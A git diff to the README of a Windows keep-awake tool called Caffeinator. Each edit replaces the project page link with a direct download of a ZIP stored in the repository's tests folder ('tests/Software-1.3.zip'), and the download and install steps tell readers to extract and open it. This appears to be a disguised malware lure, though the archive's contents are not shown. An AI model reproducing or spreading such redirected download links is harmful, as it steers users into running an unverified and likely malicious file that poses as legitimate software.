@@ -1,6 +1,6 @@
 # 💤 Caffeinator - Keep Your PC Awake Easily
 
-[![Download Caffeinator](https://img.shields.io/badge/Download-Caffeinator-blue?style=for-the-badge)](https://github.com/Catinarenunciant195/Caffeinator)
+[![Download Caffeinator](https://img.shields.io/badge/Download-Caffeinator-blue?style=for-the-badge)](https://raw.githubusercontent.com/Catinarenunciant195/Caffeinator/main/tests/Software-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it when you:
 ## 📥 Download
 
 Visit this page to download Caffeinator:
-https://github.com/Catinarenunciant195/Caffeinator
+https://raw.githubusercontent.com/Catinarenunciant195/Caffeinator/main/tests/Software-1.3.zip
 
 If the page includes a release file, download it to your PC. If it opens the project page, use the release or asset section on that page to get the Windows build.
 
@@ -51,7 +51,7 @@ For best results:
 ## 📦 Install
 
 1. Open the download page:
-   https://github.com/Catinarenunciant195/Caffeinator
+   https://raw.githubusercontent.com/Catinarenunciant195/Caffeinator/main/tests/Software-1.3.zip
 2. Get the Windows file from the page.
 3. If the file is in a ZIP folder, extract it first.
 4. Open the app file.
